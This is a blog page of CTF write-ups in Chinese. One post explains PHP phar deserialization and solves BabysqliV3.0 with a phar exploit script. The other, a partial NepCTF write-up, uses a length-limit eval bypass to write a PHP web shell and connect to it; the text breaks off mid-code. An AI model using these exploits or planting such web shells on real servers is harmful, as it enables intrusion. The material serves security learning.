<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Hexo"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="Hexo"><meta property="og:url" content="http://example.com/"><meta property="og:site_name" content="Hexo"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:author" content="John Doe"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com"},"headline":"Hexo","image":["http://example.com/img/og_image.png"],"author":{"@type":"Person","name":"John Doe"},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-25T14:03:26.000Z" title="2021-03-25T14:03:26.000Z">2021-03-25</time>发表</span><span class="level-item"><time dateTime="2021-03-25T14:09:51.095Z" title="2021-03-25T14:09:51.095Z">2021-03-25</time>更新</span><span class="level-item">8 分钟读完 (大约1184个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/25/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">phar反序列化学习</a></h1><div class="content"><h1 id="phar文件结构分析"><a href="#phar文件结构分析" class="headerlink" title="phar文件结构分析"></a>phar文件结构分析</h1><p> 大体来说 Phar 结构由4部分组成</p>
<p><strong>1.stub ：phar文件标识</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Phar::mapPhar();</span><br><span class="line">include &#39;phar:&#x2F;&#x2F;phar.phar&#x2F;index.php&#39;;</span><br><span class="line">__HALT_COMPILER();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。也就是说如果我们留下这个标志位，构造一个图片或者其他文件，那么可以绕过上传限制，并且被 phar 这函数识别利用。</p>
<p><strong>2. a manifest describing the contents</strong><br> phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
<p><strong>3. the file contents</strong><br> 被压缩文件的内容。</p>
<p><strong>4. [optional] a signature for verifying Phar integrity (phar file format only)</strong><br> 签名，放在文件末尾，格式如下</p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>把一个序列化的对象，储存在phar格式的文件中，生成后的文件可以以任意格式保存，通过文件包含函数（下图），用phar://协议包含文件，就可以把对象反序列化。<br>php中大部分文件函数在通过phar://解析phar文件时，会将meta-data进行反序列化，受影响的函数如下：</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6Xd2zF"><img src="https://z3.ax1x.com/2021/03/25/6Xd2zF.png" alt="6Xd2zF.png"></a></p>
<p>利用原理</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;destructed&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p>利用思路：$this-&gt;Filename可控，从GET参数name中获取。Uploader类中的<code>__toString()</code>方法返回<code>$this-&gt;Filename</code>，最后的flie_get_contents参数实际可直接从name参数获取，这样就可以用phar://触发反序列化。此外还需要满足条件<code>$this-&gt;token</code> 等于<code>$_SESSION[&#39;user&#39;]</code>，<code>$_SESSION[&#39;user&#39;]</code>可从文件名中获得。最后构造phar://包含文件。</p>
<p>开始用弱口令admin password登陆</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6XdgRU"><img src="https://z3.ax1x.com/2021/03/25/6XdgRU.png" alt="6XdgRU.png"></a></p>
<p>弱口令登陆进去，发现可以上传文件，但是没有给出返回路径，观察到file参数可能可以利用</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6XdsI0"><img src="https://z3.ax1x.com/2021/03/25/6XdsI0.png" alt="6XdsI0.png"></a></p>
<p>只要参数中不以home和upload结尾就会自动把后缀名改成cc.fxxkyou!</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6Xd6iV"><img src="https://z3.ax1x.com/2021/03/25/6Xd6iV.png" alt="6Xd6iV.png"></a></p>
<p>利用php://filter读取文件源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bf4bee72-3946-49dc-b598-48b3dc0ac6aa.node3.buuoj.cn&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6XdcGT"><img src="https://z3.ax1x.com/2021/03/25/6XdcGT.png" alt="6XdcGT.png"></a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//home.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/upload$/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">				<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;å½åå¼ç¨çæ¯ &quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">			<span class="keyword">require</span> <span class="variable">$file</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;no permission!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>利用思路：$this-&gt;Filename可控，从GET参数name中获取。Uploader类中的<code>__toString()</code>方法返回<code>$this-&gt;Filename</code>，最后的flie_get_contents参数实际可直接从name参数获取，这样就可以用phar://触发反序列化。此外还需要满足条件<code>$this-&gt;token</code> 等于<code>$_SESSION[&#39;user&#39;]</code>，<code>$_SESSION[&#39;user&#39;]</code>可从文件名中获得。最后构造phar://包含文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//upload.php</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    ä¸ä¼ æä»¶</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ä¸ä¼ &quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$sandbox</span> = getcwd().<span class="string">&quot;/uploads/&quot;</span>.md5(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">        @mkdir(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (â²â½`ã)&#x27;);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line">        <span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$uploader</span> = <span class="keyword">new</span> Uploader();</span><br><span class="line">    <span class="variable">$uploader</span>-&gt;upload(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(@file_get_contents(<span class="variable">$uploader</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="variable">$uploader</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>上传txt文件，得到$_SESSION[‘user’]</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6Xdraq"><img src="https://z3.ax1x.com/2021/03/25/6Xdraq.png" alt="6Xdraq.png"></a></p>
<p>构造exp，生成phar文件并上传</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;show_source(&quot;flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;GXY57eb0a54186eb32ad70deb2e3da0b903&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Uploader();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<p>读取flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dc0a112a-07ab-4130-a0cc-497b03dde141.node3.buuoj.cn&#x2F;home.php?file&#x3D;upload&amp;name&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;ef30d6288c320cd6e01dc95841a44ad0&#x2F;GXY57eb0a54186eb32ad70deb2e3da0b903.txt</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6XdDZn"><img src="https://z3.ax1x.com/2021/03/25/6XdDZn.png" alt="6XdDZn.png"></a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-23T07:34:27.000Z" title="2021-03-23T07:34:27.000Z">2021-03-23</time>发表</span><span class="level-item"><time dateTime="2021-03-23T07:45:33.179Z" title="2021-03-23T07:45:33.179Z">2021-03-23</time>更新</span><span class="level-item">8 分钟读完 (大约1259个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/23/nepctf%E9%83%A8%E5%88%86wp/">nepctf部分wp</a></h1><div class="content"><h1 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h1><p>长度限制rce</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$nep</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>];</span><br><span class="line">    <span class="variable">$len</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;len&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$len</span>)&lt;<span class="number">8</span> &amp;&amp; strlen(<span class="variable">$nep</span>)&lt;<span class="number">13</span>)&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$nep</span>,<span class="number">0</span>,<span class="variable">$len</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>传入负数即可绕过</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671PyQ"><img src="https://z3.ax1x.com/2021/03/23/671PyQ.png" alt="671PyQ.png"></a></p>
<p>直接echo写马</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node4.hackingfor.fun:34567&#x2F;052e4d95576306a511b353cae5aec562&#x2F;?len&#x3D;-1&amp;nep&#x3D;&#96;$_GET[1]&#96;;1&amp;1&#x3D;echo \&lt;?php eval\(\$_POST\[1\]\)\;&gt;2.php</span><br></pre></td></tr></table></figure>



<p>实际执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo \&lt;?php eval\(\$_POST\[1\]\)\;&gt;2.php</span><br><span class="line">echo eval\(&gt;&gt;2.php</span><br><span class="line">echo \$_POST&gt;&gt;2.php</span><br><span class="line">echo \[1\]&gt;&gt;2.php</span><br><span class="line">echo \)\;&gt;&gt;2.php</span><br></pre></td></tr></table></figure>



<p>蚁剑连接拿到flag</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/67lzJf"><img src="https://z3.ax1x.com/2021/03/23/67lzJf.png" alt="67lzJf.png"></a></p>
<h1 id="梦回牡丹亭"><a href="#梦回牡丹亭" class="headerlink" title="梦回牡丹亭"></a>梦回牡丹亭</h1><p>反序列化</p>
<p>1.Game类的__destruct方法调用checking 属性choice等于login类,属性username和password等于admin，属性register等于admin</p>
<p>2.login类的checking方法调用open，这些属性在Game类中赋值：属性file等于Open类，属性filename等于shell.php </p>
<p>3.最终执行open类的open方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span 